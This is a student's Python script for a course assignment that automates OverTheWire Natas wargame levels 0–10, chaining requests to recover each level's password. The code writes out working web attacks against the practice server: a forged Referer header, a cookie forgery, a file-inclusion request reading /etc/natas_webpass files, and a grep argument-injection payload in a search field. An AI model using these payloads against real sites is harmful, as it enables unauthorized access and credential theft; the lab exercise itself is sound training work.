##### Web Brute Force #####
##### CNS-380/597 Advanced Cybersecurity Automation - Ryan Haley####
### Conrad Mordzinski ####



'''
#1)
Visit and complete levels 0 - 10 of the Natas challenges. Attached is a setup guide for Burp.  You may use Google for this assignment if you wish for examples how to get the passwords, or reach out to me with questions.

For levels 0,4,5,6,7,8,9 and 10 write your solution using python. (I shold be able to run your .py file and it should perform an action against the natas server that results in the password for the next level)

http://overthewire.org/wargames/natas/
'''

import requests
import re

def main():
    natas()
    natas1pass = natas0()
    natas2pass = natas1(natas1pass)
    natas3pass = natas2(natas2pass)
    natas4pass = natas3(natas3pass)
    natas5pass = natas4(natas4pass)
    natas6pass = natas5(natas5pass)
    natas7pass = natas6(natas6pass)
    natas8pass = natas7(natas7pass)
    natas9pass = natas8(natas8pass)
    natas10pass = natas9(natas9pass)
    natas11pass = natas10(natas10pass)

def natas():
    print('The password for Natas0 is : Natas0')
    
def natas0():
    response = requests.get('http://natas0:natas0@natas0.natas.labs.overthewire.org/')
    natas1pass = re.findall('\w{32}',response.text)[0]
    print('The password for Natas1 is : {}'.format(natas1pass))
    return(natas1pass)


def natas1(natas1pass):
    url = 'http://natas1:{}@natas1.natas.labs.overthewire.org/'.format(natas1pass)
    response = requests.get(url)
    natas2pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas2 is : {}'.format(natas2pass))
    return(natas2pass)

def natas2(natas2pass):
    url = 'http://natas2:{}@natas2.natas.labs.overthewire.org/files/users.txt'.format(natas2pass)
    response = requests.get(url)
    natas3pass = re.findall('\w{32}',response.text)[0]
    print('The password for Natas3 is : {}'.format(natas3pass))
    return(natas3pass)

def natas3(natas3pass):
    url = 'http://natas3:{}@natas3.natas.labs.overthewire.org/s3cr3t/users.txt'.format(natas3pass)
    response = requests.get(url)
    natas4pass = re.findall('\w{32}',response.text)[0]
    print('The password for Natas4 is : {}'.format(natas4pass))
    return(natas4pass)

def natas4(natas4pass):
    url = 'http://natas4:{}@natas4.natas.labs.overthewire.org/'.format(natas4pass)
    response = requests.get(url,headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})
    natas5pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas5 is : {}'.format(natas5pass))
    return(natas5pass)

def natas5(natas5pass):
    url = 'http://natas5:{}@natas5.natas.labs.overthewire.org/'.format(natas5pass)
    response = requests.get(url,cookies={'loggedin': '1'})
    natas6pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas6 is : {}'.format(natas6pass))
    return(natas6pass)

def natas6(natas6pass):
    url = 'http://natas6:{}@natas6.natas.labs.overthewire.org/includes/secret.inc'.format(natas6pass)
    response = requests.get(url)
    secret = re.findall('\w{19}',response.text)[0]
    postreply = requests.post('http://natas6:{}@natas6.natas.labs.overthewire.org/'.format(natas6pass),data={'secret':secret,'submit':'submit'})
    natas7pass = re.findall('\w{32}',postreply.text)[1]
    print('The password for Natas7 is : {}'.format(natas7pass))
    return(natas7pass)

def natas7(natas7pass):
    url = 'http://natas7:{}@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'.format(natas7pass)
    response = requests.get(url)
    natas8pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas8 is : {}'.format(natas8pass))
    return(natas8pass)

def natas8(natas8pass):
    url = 'http://natas8:{}@natas8.natas.labs.overthewire.org/'.format(natas8pass)
    #url = 'http://natas8:{}@natas8.natas.labs.overthewire.org/index-source.html'.format(natas8pass)
    #encodedsecret = re.findall('\w{32}',response.text)[0]
    #In order to avoid importing more modules into python, I decoded the encoded secret myself and passed it as a string.
    #to do so I converted from hex to ascii, reversed it, and then base64 decoded. 
    #3d3d516343746d4d6d6c315669563362 --> ==QcCtmMml1ViV3b --> b3ViV1lmMmtCcQ== --> oubWYf2kBq
    secret = 'oubWYf2kBq'
    response = requests.post(url, data={'secret':secret,'submit':'submit'})
    natas9pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas9 is : {}'.format(natas9pass))
    return(natas9pass)

def natas9(natas9pass):
    url = 'http://natas9:{}@natas9.natas.labs.overthewire.org/'.format(natas9pass)
    response = requests.post(url, data={'needle':'.* /etc/natas_webpass/natas10','submit':'Search'})
    natas10pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas10 is : {}'.format(natas10pass))
    return(natas10pass)

def natas10(natas10pass):
    url = 'http://natas10:{}@natas10.natas.labs.overthewire.org/'.format(natas10pass)
    response = requests.post(url, data={'needle':'.* /etc/natas_webpass/natas11','submit':'Search'})
    natas11pass = re.findall('\w{32}',response.text)[1]
    print('The password for Natas11 is : {}'.format(natas11pass))
    return(natas11pass)

main()

